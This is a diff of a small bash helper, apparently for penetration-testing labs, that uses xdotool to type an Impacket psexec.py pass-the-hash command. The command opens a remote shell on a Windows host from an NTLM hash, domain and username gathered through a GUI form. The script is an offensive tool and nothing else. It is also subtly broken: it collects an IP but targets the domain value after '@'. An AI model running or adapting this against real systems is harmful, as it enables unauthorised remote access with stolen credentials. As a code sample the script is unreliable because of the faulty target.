@@ -1,9 +1,19 @@
 #!/bin/bash
 
 : '
-Impacket: psexec.py get NTLM hashes with user.
+Impacket: psexec.py get psexec shell 
 '
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
+source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
 
-paste_command "psexec.py administrator@10.129.80.76 -hashes "
+# Generate gui form
+generate_form "Hash" "Domain" "Username" "IP"
+
+HASH=${form_data["Hash"]}
+DOMAIN=${form_data["Domain"]}
+USERNAME=${form_data["Username"]}
+IP=${form_data["IP"]}
+
+paste_command "psexec.py -hashes '${HASH}' '${DOMAIN}/${USERNAME}@${DOMAIN}'"
+xdotool key Return
